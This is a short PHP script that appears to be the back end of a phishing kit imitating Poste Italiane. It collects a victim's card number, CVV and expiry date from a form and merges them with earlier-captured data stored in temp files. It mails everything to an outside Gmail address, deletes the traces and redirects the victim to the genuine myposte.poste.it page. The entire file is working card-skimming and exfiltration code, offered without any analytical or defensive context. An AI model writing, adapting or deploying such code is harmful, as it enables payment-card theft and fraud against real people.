<?php
$dat3=date("D M d, Y g:i a");
$ipr = getenv("REMOTE_ADDR");
$myFile = "/tmp/temp2_$ipr.txt";
$fh = fopen($myFile, 'w');
$edit = "Card number: ".$_POST['nr']."\n";
fwrite($fh, $edit);
$edit = "CVV: ".$_POST['Cvv2']."\n";
fwrite($fh, $edit);
$edit = "Data: ".$_POST['luna']."-".$_POST['an']."\n";
fwrite($fh, $edit);
fclose($fh);
$file1 = file_get_contents("/tmp/temp1_$ipr.txt");
$file2 = file_get_contents("/tmp/temp2_$ipr.txt");
$message = "$file1\n";
$message .= "$file2\n";
$to="mailutauu@gmail.com";
$subj = "$ipr";
$from = "Your Geta";
mail ($to, $subj, $message, $from);
$filename1 = "/tmp/temp1_$ipr.txt";
$filename2 = "/tmp/temp2_$ipr.txt";
unlink($filename1);
unlink($filename2);
		   header("Location: https://myposte.poste.it/jod-fcc/fcc-authentication.jsp");
?>
